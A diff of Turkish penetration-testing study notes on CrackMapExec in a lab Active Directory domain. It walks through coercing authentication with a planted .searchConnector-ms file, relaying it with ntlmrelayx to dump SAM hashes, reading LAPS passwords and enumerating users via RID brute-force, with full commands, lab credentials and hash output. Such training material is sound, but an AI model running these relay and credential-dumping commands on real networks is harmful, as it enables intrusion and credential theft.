@@ -3309,235 +3309,746 @@ on the IT-Tools share
 ```
 
 ### drop-sc Modülü ile Hash'lerin Çalınması
-Bu bölümü tamamlamadan önce, **LNK** dışındaki bir dosya formatı kullanarak kimlik doğrulamayı zorlamanın başka bir yöntemine bakalım:[ **.searchConnector-ms**](https://learn.microsoft.com/en-us/windows/win32/search/search-sconn-desc-schema-entry) ve **.library-ms** formatları. Bu dosya formatlarının çoğu Windows sürümünde varsayılan dosya ilişkilendirmeleri bulunur. Windows ile entegre olarak, belirtilen bir WebDAV paylaşımı gibi uzaktaki bir konumu gösterebilecek şekilde, herhangi bir konumdan içerik görüntülemelerini sağlarlar.
 
-Özünde, LNK dosyası ile aynı fonksiyonu yerine getirirler. Bu yöntemin keşfi hakkında daha fazla bilgi edinmek için Windows'ta search connectors ve library dosyalarını keşfetmek başlıklı [blog](https://dtm.uk/exploring-search-connectors-and-library-files-on-windows/) yazısını okuyabilirsiniz.
+Bu bölümü tamamlamadan önce, **LNK** dışında başka bir dosya formatı kullanarak kimlik doğrulamasını zorlamanın başka bir yöntemine bakalım: **[.searchConnector-ms](https://learn.microsoft.com/en-us/windows/win32/search/search-sconn-desc-schema-entry)** ve **`.library-ms`** formatları. Bu dosya formatlarının çoğu Windows sürümünde **varsayılan dosya ilişkilendirmeleri** bulunur. Windows ile entegre çalışarak içeriği rastgele bir konumdan, hatta **`WebDAV` paylaşımıyla belirtilen remote bir konumdan** gösterebilirler.
 
-CrackMapExec, paylaşılan bir klasörde bir searchConnector-ms dosyası oluşturmamızı sağlayan drop-sc adlı bir modüle sahiptir. Bunu kullanmak için, SMB fake sunucumuzu hedeflemek için URL seçeneğini belirtmemiz gerekir. Bu durumda, ntlmrelayx çalıştıran hostumuz. URL'nin çift ters eğik çizgi (\) ile kaçması gerekir, örneğin: URL=\\\\10.10.14.33\\secret .
+Özetle, bu dosyalar **LNK** dosyasıyla aynı işlevi görür. Bu yöntemin keşfi hakkında daha fazla bilgi edinmek için **"[Exploring search connectors and library files in Windows](https://dtm.uk/exploring-search-connectors-and-library-files-on-windows/)"** başlıklı blog yazısını okuyabiliriz.
+
+CrackMapExec, **`drop-sc`** adında bir modüle sahiptir. Bu modül, paylaşılan bir klasörde **`searchConnector-ms`** dosyası oluşturmamıza olanak tanır. Kullanabilmek için **URL** seçeneğini belirterek **SMB fake sunucumuzu** hedef göstermemiz gerekir. Bu durumda, **`ntlmrelayx`** çalıştıran hostumuz olacaktır. **URL** değeri çift ters eğik çizgi (`\`) ile kaçırılmalıdır. Örneğin: **`URL=\\10.10.14.33\secret`**.
 
 İsteğe bağlı olarak aşağıdaki seçenekleri belirleyebiliriz:
 
-* SHARE=name seçeneği ile hedef paylaşımlı klasör . Bu seçeneği belirtmezsek, dosyayı WRITE izinlerine sahip tüm paylaşımlara yazacaktır
+* `SHARE=name` seçeneği ile hedef paylaşımlı klasör . Bu seçeneği belirtmezsek, dosyayı `WRITE` izinlerine sahip tüm paylaşımlara yazacaktır
 
-* FILENAME=name seçeneği ile dosya adı . Bu seçeneği belirtmezsek, “Belgeler” adında bir dosya oluşturacaktır.
+* `FILENAME=name` seçeneği ile dosya adı . Bu seçeneği belirtmezsek, “`Documents`” adında bir dosya oluşturacaktır.
 
-* Oluşturduğumuz dosyaları temizlemek istiyorsak CLEANUP=True seçeneği. Eğer özel bir isim kullanacaksak filename seçeneğini belirtmemiz gerekiyor.
+* Oluşturduğumuz dosyaları temizlemek istiyorsak `CLEANUP=True` seçeneği. Eğer özel bir isim kullanacaksak filename seçeneğini belirtmemiz gerekiyor.
 
 Drop-sc'yi iş başında görelim:
 
-
 ### Dropping a searchConnector-ms File
 
-![Pasted image 20241202202007.png](/img/user/resimler/Pasted%20image%2020241202202007.png)
+```
+crackmapexec smb -M drop-sc --options
 
-![Pasted image 20241202202025.png](/img/user/resimler/Pasted%20image%2020241202202025.png)
+[*] drop-sc module options:
+ Technique discovered by @DTMSecurity and @domchell to remotely
+coerce a host to start WebClient service.
+ https://dtm.uk/exploring-search-connectors-and-library-fileson-windows/
+ Module by @zblurx
+ URL URL in the searchConnector-ms file, default
+https://rickroll
+ CLEANUP Cleanup (choices: True or False)
+ SHARE Specify a share to target
+ FILENAME Specify the filename used WITHOUT the extension
+searchConnector-ms (it's automatically added); the default is "Documents".
+```
 
-Bir kullanıcı paylaşılan klasöre eriştiğinde ve ntlmrelayx dinlerken, hedef makineye de aktarım yapabilmeliyiz.
+```
+proxychains4 -q crackmapexec smb 172.16.1.10 -u grace -p Inlanefreight01!
+-M drop-sc -o URL=\\\\10.10.14.33\\secret SHARE=IT-Tools FILENAME=secret
 
+[!] Module is not opsec safe, are you sure you want to run this? [Y/n] Y
+SMB 172.16.1.10 445 DC01 [*] Windows 10.0 Build
+17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
+(SMBv1:False)
+SMB 172.16.1.10 445 DC01 [+]
+inlanefreight.htb\grace:Inlanefreight01!
+DROP-SC 172.16.1.10 445 DC01 [+] Found writable
+share: IT-Tools
+DROP-SC 172.16.1.10 445 DC01 [+] Created
+secret.searchConnector-ms file on the IT-Tools share
+```
 
-### NTLMRelayx ve drop-sc Kullanarak Aktarma
+Bir kullanıcı **paylaşılan klasöre** eriştiğinde ve **ntlmrelayx** dinleme modunda çalışırken, kimlik bilgilerini **hedef makineye yönlendirebilmemiz** gerekir.
 
-![Pasted image 20241202202103.png](/img/user/resimler/Pasted%20image%2020241202202103.png)
-![Pasted image 20241202202112.png](/img/user/resimler/Pasted%20image%2020241202202112.png)
+### NTLMRelayx ve drop-sc Kullanarak Yönlendirme
 
-Son olarak, CLEANUP=True seçeneği ile .searchConnector-ms dosyasını temizleyebiliriz:
+```
+sudo proxychains4 -q ntlmrelayx.py -tf relay.txt -smb2support --no-http
+
+Impacket v0.10.1.dev1+20220720.103933.3c6713e3 - Copyright 2022 SecureAuth
+Corporation
+<SNIP>
+[*] Servers started, waiting for connections
+[*] SMBD-Thread-4: Connection from INLANEFREIGHT/[email protected]
+controlled, attacking target smb://172.16.1.5
+[*] Authenticating against smb://172.16.1.5 as INLANEFREIGHT/JULIO SUCCEED
+[*] SMBD-Thread-4: Connection from INLANEFREIGHT/[email protected]
+controlled, but there are no more targets left!
+[*] Service RemoteRegistry is in stopped state
+[*] Starting service RemoteRegistry
+[*] Target system bootKey: 0x29fc3535fc09fb37d22dc9f3339f6875
+[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:30b3783ce2abf1af70f77d0
+660cf3453:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c
+0:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59
+d7e0c089c0:::
+WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:4b4ba140ac0767077a
+ee1958e7f78070:::
+localadmin:1003:aad3b435b51404eeaad3b435b51404ee:7c08d63a2f48f045971bc2236
+ed3f3ac:::
+sshd:1004:aad3b435b51404eeaad3b435b51404ee:d24156d278dfefe29553408e826a95f
+6:::
+htb:1006:aad3b435b51404eeaad3b435b51404ee:6593d8c034bbe9db50e4ce94b1943701
+:::
+[*] Done dumping SAM hashes for host: 172.16.1.5
+[*] Stopping service RemoteRegistry
+
+```
+
+Son olarak, `CLEANUP=True` seçeneği ile `.searchConnector-ms` dosyasını temizleyebiliriz:
 
 
 ### searchConnector-ms Dosyalarını Temizleme
-![Pasted image 20241202202155.png](/img/user/resimler/Pasted%20image%2020241202202155.png)
-![Pasted image 20241202202201.png](/img/user/resimler/Pasted%20image%2020241202202201.png)
 
-LNK dosyaları genellikle bu tür saldırılar için bilinir. .searchConnector-ms gibi başka bir dosya türü kullanmak, fark edilmemenize yardımcı olabilir.
+```
+proxychains4 -q crackmapexec smb 172.16.1.10 -u grace -p Inlanefreight01! -M drop-sc -o CLEANUP=True FILENAME=secret
+
+[!] Module is not opsec safe, are you sure you want to run this? [Y/n] y
+SMB 172.16.1.10 445 DC01 [*] Windows 10.0 Build
+17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
+(SMBv1:False)
+SMB 172.16.1.10 445 DC01 [+]
+inlanefreight.htb\grace:Inlanefreight01!
+DROP-SC 172.16.1.10 445 DC01 [+] Found writable
+share: IT-Tools
+DROP-SC 172.16.1.10 445 DC01 [+] Deleted
+secret.searchConnector-ms file on the IT-Tools share
+
+```
 
 
-### SMB ile Eşleme ve Numaralandırma
+LNK dosyaları genellikle bu tür saldırılar için bilinir. `.searchConnector-ms` gibi başka bir dosya türü kullanmak, fark edilmemenize yardımcı olabilir.
+
+Sonraki bölümlerde CrackMapExec'in keşif seçeneklerini inceleyeceğiz.
+
+---
+
+
+### SMB ile Mapping ve Enumeration
 
 CrackMapExec, geçerli bir domain kullanıcı hesabıyla numaralandırma söz konusu olduğunda çok daha fazla seçenekle birlikte gelir. En çok kullanılan seçenekleri ele aldık, ancak daha derine inelim. İşte ayrıcalıklı olmasa bile geçerli bir hesap aldığımızda kullanabileceğimiz tüm seçeneklerin listesi:
 
-![Pasted image 20241202202635.png](/img/user/resimler/Pasted%20image%2020241202202635.png)
-![Pasted image 20241202202649.png](/img/user/resimler/Pasted%20image%2020241202202649.png)
+| Komut                                                                 | Açıklama                                                          |
+| --------------------------------------------------------------------- | ----------------------------------------------------------------- |
+| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --loggedon-users` | Hedefte oturum açmış kullanıcıları listeler.                      |
+| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --sessions`       | Hedefteki aktif oturumları listeler.                              |
+| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --disks`          | Hedefteki diskleri listeler.                                      |
+| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --computers`      | Hedef ağdaki bilgisayarları listeler.                             |
+| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --wmi`            | Belirtilen WMI sorgusunu çalıştırır.                              |
+| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --wmi-namespace`  | WMI Namespace’ini belirtir (varsayılan: `root\cimv2`).            |
+| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --rid-brute`      | Hedef üzerinde RID brute-force yöntemiyle kullanıcıları listeler. |
+| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --local-groups`   | Local grupları listeler; grup belirtilirse üyelerini listeler.    |
+| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --shares`         | Hedefteki tüm paylaşım izinlerini listeler.                       |
+| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --users`          | Hedefteki domain kullanıcılarını listeler.                        |
+| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --groups`         | Hedefteki domain gruplarını listeler.                             |
+| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --pass-pol`       | Domainin password policy'sini gösterir.                           |
 
 Daha önce çalışmamış olanları gözden geçirelim:
 
-### Hedefteki etkin oturumları / oturum açmış kullanıcıları numaralandırma
+### Hedefteki aktif oturumları / oturum açmış kullanıcıları numaralandırma
 
-Birden fazla hedefi tehlikeye attıysak, etkin oturumları kontrol etmeye değer olabilir, belki bir domain yöneticisi vardır ve çabamızı bu belirli hedefe odaklamamız gerekir. Bir bilgisayardaki kullanıcıları tanımlamak için --sessions ve --loggedon-users seçeneklerini kullanabiliriz. Oturumlar, kullanıcı oturum açmamış olsa bile kullanıcı kimlik bilgilerinin hedef makinede kullanıldığı anlamına gelir. Oturum açmış kullanıcılar kendi kendini açıklar; bir kullanıcının hedef makinede oturum açtığı anlamına gelir. Bloodhound, aktif oturumları bulmak için kullanabileceğimiz başka bir araçtır.
+Birden fazla hedefi ele geçirmişsek, aktif oturumları kontrol etmek faydalı olabilir, belki bir domain administrator vardır ve bu belirli hedefe odaklanmamız gerekebilir. Bir bilgisayardaki kullanıcıları tespit etmek için `--sessions` ve `--loggedon-users` seçeneklerini kullanabiliriz. Session'lar, kullanıcının hedef makinede giriş yapmıyor olsa da kullanıcı kimlik bilgileriyle oturum açıldığı anlamına gelir. Giriş yapmış kullanıcılar ise kendiliğinden anlaşılır; bir kullanıcının hedef makineye giriş yapmış olduğunu ifade eder. `BloodHound`, aktif oturumları bulmak için kullanabileceğimiz bir diğer araçtır.
 
 
 ### Sessions ve loggendon-users seçeneklerini kullanma
-![Pasted image 20241202203026.png](/img/user/resimler/Pasted%20image%2020241202203026.png)
 
-Belirli bir kullanıcıyı arıyorsak, --loggedon-users-filter seçeneğini ve ardından aradığımız kullanıcının adını kullanabiliriz. Birden fazla kullanıcı arıyorsak, regex'i de destekler.
+```
+crackmapexec smb 10.129.203.121 -u robert -p Inlanefreight01! --loggedonusers
+
+SMB 10.129.203.121 445 DC01 [*] Windows 10.0 Build
+17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
+(SMBv1:False)
+SMB 10.129.203.121 445 DC01 [+]
+inlanefreight.htb\robert:Inlanefreight01!
+SMB 10.129.203.121 445 DC01 [+] Enumerated
+loggedon users
+SMB 10.129.203.121 445 DC01 INLANEFREIGHT\julio
+logon_server: DC01
+SMB 10.129.203.121 445 DC01 INLANEFREIGHT\DC01$
+SMB 10.129.203.121 445 DC01
+INLANEFREIGHT\svc_workstations logon_server: DC01
+```
+
+Belirli bir kullanıcıyı arıyorsak, -`-loggedon-users-filter` seçeneğini ve ardından aradığımız kullanıcının adını kullanabiliriz. Birden fazla kullanıcı arıyorsak, `regex`'i de destekler.
 
 
 ### Oturum açmış kullanıcılarla filtre seçeneğini kullanma
-![Pasted image 20241202203114.png](/img/user/resimler/Pasted%20image%2020241202203114.png)
-![Pasted image 20241202203120.png](/img/user/resimler/Pasted%20image%2020241202203120.png)
+
+```
+crackmapexec smb 10.129.203.121 -u robert -p Inlanefreight01! --loggedonusers --loggedon-users-filter julio
+
+SMB 10.129.203.121 445 DC01 [*] Windows 10.0 Build
+17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True) (SMBv1:False)
+SMB 10.129.203.121 445 DC01 [+] inlanefreight.htb\julio:Password1 (Pwn3d!)
+SMB 10.129.203.121 445 DC01 [+] Enumerated loggedon users
+SMB 10.129.203.121 445 DC01 INLANEFREIGHT\julio logon_server: DC01
+```
+
+Not: Genellikle, `--loggedon-users` veya `--sessions` parametrelerinin başarılı bir şekilde çalıştırılabilmesi için administrator izinleri gereklidir.
+
 
 
 ### Enumerate Computers
 
 CME ayrıca domain bilgisayarlarını da listeleyebilir ve bunu bir LDAP isteği gerçekleştirerek yapar
 
-
 ### Domain'deki Bilgisayarları Numaralandırma
-![Pasted image 20241202203511.png](/img/user/resimler/Pasted%20image%2020241202203511.png)
+
+```
+crackmapexec smb 10.129.203.121 -u robert -p Inlanefreight01! --computers
+
+SMB 10.129.203.121 445 DC01 [*] Windows 10.0 Build
+17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
+(SMBv1:False)
+SMB 10.129.203.121 445 DC01 [+] inlanefreight.htb\robert:Inlanefreight01!
+SMB 10.129.203.121 445 DC01 [+] Enumerated domain computer(s)
+SMB 10.129.203.121 445 DC01 inlanefreight.htb\MS01$
+SMB 10.129.203.121 445 DC01 inlanefreight.htb\DC01$
+
+```
+
 
 Not: Bu seçenek yalnızca SMB protokolünde mevcut olsa da, CME bir LDAP sorgusu yapmaktadır.
 
 
 ### Enumerate LAPS
 
-Local Administrator Password Solution (LAPS), domain'e bağlı bilgisayarların local hesap parolalarının yönetimini sağlar. Parolalar Active Directory'de (AD) saklanır ve ACL tarafından korunur, böylece yalnızca uygun kullanıcılar bunları okuyabilir veya sıfırlama talebinde bulunabilir. LAPS domain içinde kullanılıyorsa ve LAPS şifrelerini okuyabilen bir hesabı tehlikeye atarsak, --laps seçeneğini bir hedef listesi ile kullanabilir ve komutları çalıştırabilir veya --sam gibi diğer seçenekleri kullanabiliriz.
+Local Administrator Password Solution (LAPS), domain'e bağlı bilgisayarların local hesap parolalarının yönetimini sağlar. Parolalar Active Directory'de (AD) saklanır ve ACL tarafından korunur, böylece yalnızca uygun kullanıcılar bunları okuyabilir veya sıfırlama talebinde bulunabilir. LAPS domain içinde kullanılıyorsa ve LAPS şifrelerini okuyabilen bir hesabı tehlikeye atarsak, `--laps` seçeneğini bir hedef listesi ile kullanabilir ve komutları çalıştırabilir veya `--sam` gibi diğer seçenekleri kullanabiliriz.
 
-![Pasted image 20241202203817.png](/img/user/resimler/Pasted%20image%2020241202203817.png)
 
-![Pasted image 20241202203835.png](/img/user/resimler/Pasted%20image%2020241202203835.png)
+```
+(mgm@kull)-/CrackMapExec
+$ poetry run crackmapexec idap poudlard.wizard tom=October2021 -W laps
+192.168.133.148 445 poudlard.wizard [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:poudlard.wizard) (signing:True) (SMBv1:LDAP)
+192.168.133.148 389 poudlard.wizard [*] poudlard.wizard\tom:October2021
+192.168.133.148 389 DC01 [*] Getting LAPS Passwords
+192.168.133.148 389 DC01 Computer: DC015 Password: DW/9[pl65M0090
+192.168.133.148 389 DC01 Computer: ADCS5 Password: A3)[qoAC56Hf5t
+192.168.133.148 389 DC01 Computer: SOL015 Password: k9nzH6cBeFBv1-]
 
-![Pasted image 20241202203857.png](/img/user/resimler/Pasted%20image%2020241202203857.png)
 
-Not: Varsayılan yönetici hesabı adı “administrator” değilse, kullanıcı adını --laps kullanıcı adı seçeneğinden sonra ekleyin.
+(mgm@kull)-/CrackMapExec
+$ poetry run crackmapexec smb /tmp/hosts tom=October2021 -L laps
+192.168.133.138 445 192.168.133.138 [*] Windows 10.0 Build 17763 x64 (name:ADCS) (domain:poudlard.wizard) (signing:False) (SMBv1:SMB)
+192.168.133.138 445 192.168.133.167 [*] Windows Server 2016 Datacenter Evaluation 14393 x64 (name:SQL01) (domain:poudlard.wizard)
+192.168.133.138 445 192.168.133.138 [*] ADCS\administrator:A3)[qoAC56Hf5t (Pwn3d!)
+192.168.133.147 445 192.168.133.167 [*] SQL01\administrator:k9nzH6cBeFBv1- (Pwn3d!)
 
+
+(mgm@kull)-/CrackMapExec
+$ poetry run crackmapexec smb /tmp/hosts tom=October2021 -L laps -SAM
+192.168.133.147 445 192.168.133.167 [*] Windows Server 2016 Datacenter Evaluation 14393 x64 (name:SQL01) (domain:poudlard.wizard)
+192.168.133.148 445 192.168.133.138 [*] Windows 10.0 Build 17763 x64 (name:ADCS) (domain:poudlard.wizard) (signing:False) (SMBv1:SMB)
+192.168.133.147 445 192.168.133.167 [*] SQL01\administrator:k9nzH6cBeFBv1- (Pwn3d!)
+192.168.133.148 445 192.168.133.138 [*] ADCS\administrator:A3)[qoAC56Hf5t (Pwn3d!)
+192.168.133.147 445 192.168.133.167 [*] Dumping SAM hashes
+192.168.133.147 445 192.168.133.167 Administrator:500:aad3b435b51404eeaad3b435b51404ee:459d09c80f5cdb8cbcfc2e937b4aa84:::
+192.168.133.147 445 192.168.133.167 Guest:501:aad3b435b51404eeaad3b435b51404ee:3146cfedd16ae931b73c59d7e0c089c0:::
+192.168.133.147 445 192.168.133.167 DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:3146cfedd16ae931b73c59d7e0c089c0:::
+192.168.133.147 445 192.168.133.167 [*] Added 7 SAM hashes to the database
+192.168.133.148 445 192.168.133.138 [*] Dumping SAM hashes
+192.168.133.148 445 192.168.133.138 Administrator:500:aad3b435b51404eeaad3b435b51404ee:24cf58cdd659d17a0e2e24457b531c:::
+192.168.133.148 445 192.168.133.138 Guest:501:aad3b435b51404eeaad3b435b51404ee:3146cfedd16ae931b73c59d7e0c089c0:::
+192.168.133.148 445 192.168.133.138 DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:3146cfedd16ae931b73c59d7e0c089c0:::
+192.168.133.148 445 192.168.133.138 WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:cdde631ea957359bbc5fe18d942318ca:::
+192.168.133.148 445 192.168.133.138 Toto:1000:aad3b435b51404eeaad3b435b51404ee:999e1c2a932ad329d813e12497fb5e51:::
+192.168.133.148 445 192.168.133.138 Test:1001:aad3b435b51404eeaad3b435b51404ee:0210e4a570d22539c0bc588587d2a76e1:::
+192.168.133.148 445 192.168.133.138 adminLocal:1002:aad3b435b51404eeaad3b435b51404ee:999e1c2a932ad329d81236f249fb3c51:::
+192.168.133.148 445 192.168.133.138 [*] Added 7 SAM hashes to the database
+```
+
+Not: Eğer varsayılan administrator hesap adı "`administrator`" değilse, -`-laps username` seçeneğinden sonra kullanıcı adını ekleyin.
 
 ### Hedefteki RID'yi Brute-forcing yaparak Kullanıcıları Numaralandır --rid-brute
 
-Nadiren kullanılan bir özellik, kullanıcı listeleri oluşturmak için RID Bruteforce'dur. BloodHound veya PowerView ile bir kullanıcı listesi oluşturabiliriz. Ancak, bu teknikler muhtemelen yakalanacak ve kurulumu biraz zaman alacaktır. CrackMapExec'in --rid-brute seçeneğini kullanarak, UserID'sini brute forcing yaparak bir kullanıcı listesi toplamak mümkündür.
+Nadiren kullanılan bir özellik, kullanıcı listeleri oluşturmak için `RID Bruteforce`'dur. `BloodHound` veya `PowerView` ile bir kullanıcı listesi oluşturabiliriz. Ancak, bu teknikler muhtemelen yakalanacak ve kurulumu biraz zaman alacaktır. CrackMapExec'in `--rid-brute` seçeneğini kullanarak, UserID'sini brute forcing yaparak bir kullanıcı listesi toplamak mümkündür.
 
 
 ### List Local Users
 
-![Pasted image 20241202204115.png](/img/user/resimler/Pasted%20image%2020241202204115.png)
-![Pasted image 20241202204130.png](/img/user/resimler/Pasted%20image%2020241202204130.png)
-![Pasted image 20241202204141.png](/img/user/resimler/Pasted%20image%2020241202204141.png)
-![Pasted image 20241202204153.png](/img/user/resimler/Pasted%20image%2020241202204153.png)
-![Pasted image 20241202204200.png](/img/user/resimler/Pasted%20image%2020241202204200.png)
+```
+crackmapexec smb 10.129.203.121 -u grace -p Inlanefreight01! --rid-brute
 
-Varsayılan olarak, --rid-brute 4000'e kadar RID'leri zorlayarak nesneleri numaralandırır. Davranışını --rid-brute [MAX_RID] kullanarak değiştirebiliriz.
+SMB 10.129.203.121 445 DC01 [*] Windows 10.0 Build
+17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
+(SMBv1:False)
+SMB 10.129.203.121 445 DC01 [+]
+inlanefreight.htb\grace:Inlanefreight01!
+SMB 10.129.203.121 445 DC01 [+] Brute forcing RIDs
+SMB 10.129.203.121 445 DC01 498:
+INLANEFREIGHT\Enterprise Read-only Domain Controllers (SidTypeGroup)
+SMB 10.129.203.121 445 DC01 500:
+INLANEFREIGHT\Aministrator (SidTypeUser)
+SMB 10.129.203.121 445 DC01 501:
+INLANEFREIGHT\Guest (SidTypeUser)
+SMB 10.129.203.121 445 DC01 502:
+INLANEFREIGHT\krbtgt (SidTypeUser)
+SMB 10.129.203.121 445 DC01 512:
+INLANEFREIGHT\Domain Admins (SidTypeGroup)
+SMB 10.129.203.121 445 DC01 513:
+INLANEFREIGHT\Domain Users (SidTypeGroup)
+SMB 10.129.203.121 445 DC01 514:
+INLANEFREIGHT\Domain Guests (SidTypeGroup)
+SMB 10.129.203.121 445 DC01 515:
+INLANEFREIGHT\Domain Computers (SidTypeGroup)
+SMB 10.129.203.121 445 DC01 516:
+INLANEFREIGHT\Domain Controllers (SidTypeGroup)
+SMB 10.129.203.121 445 DC01 517:
+INLANEFREIGHT\Cert Publishers (SidTypeAlias)
+SMB 10.129.203.121 445 DC01 518:
+INLANEFREIGHT\Schema Admins (SidTypeGroup)
+SMB 10.129.203.121 445 DC01 519:
+INLANEFREIGHT\Enterprise Admins (SidTypeGroup)
+SMB 10.129.203.121 445 DC01 520:
+INLANEFREIGHT\Group Policy Creator Owners (SidTypeGroup)
+SMB 10.129.203.121 445 DC01 521:
+INLANEFREIGHT\Read-only Domain Controllers (SidTypeGroup)
+SMB 10.129.203.121 445 DC01 522:
+INLANEFREIGHT\Cloneable Domain Controllers (SidTypeGroup)
+SMB 10.129.203.121 445 DC01 525:
+INLANEFREIGHT\Protected Users (SidTypeGroup)
+SMB 10.129.203.121 445 DC01 526: INLANEFREIGHT\Key
+Admins (SidTypeGroup)
+SMB 10.129.203.121 445 DC01 527:
+INLANEFREIGHT\Enterprise Key Admins (SidTypeGroup)
+SMB 10.129.203.121 445 DC01 553: INLANEFREIGHT\RAS
+and IAS Servers (SidTypeAlias)
+SMB 10.129.203.121 445 DC01 571:
+INLANEFREIGHT\Allowed RODC Password Replication Group (SidTypeAlias)
+SMB 10.129.203.121 445 DC01 572:
+INLANEFREIGHT\Denied RODC Password Replication Group (SidTypeAlias)
+SMB 10.129.203.121 445 DC01 1002:
+INLANEFREIGHT\DC01$ (SidTypeUser)
+SMB 10.129.203.121 445 DC01 1103:
+INLANEFREIGHT\DnsAdmins (SidTypeAlias)
+SMB 10.129.203.121 445 DC01 1104:
+INLANEFREIGHT\DnsUpdateProxy (SidTypeGroup)
+SMB 10.129.203.121 445 DC01 1106:
+INLANEFREIGHT\julio (SidTypeUser)
+SMB 10.129.203.121 445 DC01 1107:
+INLANEFREIGHT\david (SidTypeUser)
+SMB 10.129.203.121 445 DC01 1108:
+INLANEFREIGHT\john (SidTypeUser)
+SMB 10.129.203.121 445 DC01 1109:
+INLANEFREIGHT\svc_workstations (SidTypeUser)
+SMB 10.129.203.121 445 DC01 2107: INLANEFREIGHT\MS01$ (SidTypeUser) SMB 10.129.203.121 445 DC01 2606: INLANEFREIGHT\carlos (SidTypeUser) SMB 10.129.203.121 445 DC01 2607: INLANEFREIGHT\robert (SidTypeUser) SMB 10.129.203.121 445 DC01 2608: INLANEFREIGHT\Linux Admins (SidTypeGroup) SMB 10.129.203.121 445 DC01 2609: INLANEFREIGHT\LINUX01$ (SidTypeUser)
+SMB 10.129.203.121 445 DC01 2107:
+INLANEFREIGHT\MS01$ (SidTypeUser)
+SMB 10.129.203.121 445 DC01 2606:
+INLANEFREIGHT\carlos (SidTypeUser)
+SMB 10.129.203.121 445 DC01 2607:
+INLANEFREIGHT\robert (SidTypeUser)
+SMB 10.129.203.121 445 DC01 2608:
+INLANEFREIGHT\Linux Admins (SidTypeGroup)
+SMB 10.129.203.121 445 DC01 2609:
+INLANEFREIGHT\LINUX01$ (SidTypeUser)
 
-rid-brute seçeneği, brute ile zorlanan kimliklerle eşleşen kullanıcı adlarını ve diğer Active Directory nesnelerini almak için kullanılabilir. NULL Authentication etkinleştirilmişse domain hesaplarını numaralandırmak için de kullanılabilir. Bu seçeneğin bu şekillerde kullanılabileceğini unutmamak önemlidir.
+```
 
+Varsayılan olarak, `--rid-brute 4000`'e kadar RID'leri zorlayarak objeleri numaralandırır. Davranışını `--rid-brute [MAX_RID]` kullanarak değiştirebiliriz.
+
+`--rid-brute` seçeneği, brute ile zorlanan kimliklerle eşleşen kullanıcı adlarını ve diğer Active Directory objeleri almak için kullanılabilir. `NULL Authentication` etkinleştirilmişse domain hesaplarını numaralandırmak için de kullanılabilir. Bu seçeneğin bu şekillerde kullanılabileceğini unutmamak önemlidir.
 
 ### Enumerate Disks
 
-Bazen kontrol etmeyi hatırlamamız gereken önemli bir parça, bir sunucuda bulunabilecek ek disklerdir. CrackMapExec, sunucuda var olan diskleri kontrol etmemizi sağlayan bir --disks seçeneğine sahiptir.
+Bazen kontrol etmeyi hatırlamamız gereken önemli bir parça, bir sunucuda bulunabilecek ek disklerdir. CrackMapExec, sunucuda var olan diskleri kontrol etmemizi sağlayan bir `--disks` seçeneğine sahiptir.
 
 ### Enumerating Disks
-![Pasted image 20241202204448.png](/img/user/resimler/Pasted%20image%2020241202204448.png)
+
+```
+crackmapexec smb 10.129.203.121 -u robert -p Inlanefreight01! --disks
+
+SMB 10.129.203.121 445 DC01 [*] Windows 10.0 Build
+17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
+(SMBv1:False)
+SMB 10.129.203.121 445 DC01 [+]
+inlanefreight.htb\robert:Inlanefreight01!
+SMB 10.129.203.121 445 DC01 [+] Enumerated disks
+SMB 10.129.203.121 445 DC01 C:
+SMB 10.129.203.121 445 DC01 D:
+
+```
 
 
 ### Local ve Domain Gruplarını Numaralandırma
-Local-groups ile local grupları veya --groups ile domain gruplarını listeleyebiliriz.
+
+Local-groups ile local grupları veya `--groups` ile domain gruplarını listeleyebiliriz.
 
 ### Enumerating Local Groups
-![Pasted image 20241202204607.png](/img/user/resimler/Pasted%20image%2020241202204607.png)
-![Pasted image 20241202204629.png](/img/user/resimler/Pasted%20image%2020241202204629.png)
 
+```
+crackmapexec smb 10.129.203.121 -u robert -p Inlanefreight01! --localgroups
+SMB 10.129.203.121 445 DC01 [*] Windows 10.0 Build
+17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
+(SMBv1:False)
+SMB 10.129.203.121 445 DC01 [+]
+inlanefreight.htb\robert:Inlanefreight01!
+SMB 10.129.203.121 445 DC01 [+] Enumerated local
+groups
+SMB 10.129.203.121 445 DC01 Cert Publishers
+membercount: 0
+SMB 10.129.203.121 445 DC01 RAS and IAS Servers
+membercount: 0
+SMB 10.129.203.121 445 DC01 Allowed RODC Password
+Replication Group membercount: 0
+SMB 10.129.203.121 445 DC01 Denied RODC Password
+Replication Group membercount: 8
+SMB 10.129.203.121 445 DC01 DnsAdmins
+membercount: 0
+SMB 10.129.203.121 445 DC01
+SQLServer2005SQLBrowserUser$DC01 membercount: 0
+SMB 10.129.203.121 445 DC01 Server Operators
+membercount: 5
+<SNIP>
+SMB 10.129.203.121 445 DC01 Remote Management
+Users membercount: 3
+SMB 10.129.203.121 445 DC01 Storage Replica
+Administrators membercount: 0
+```
 
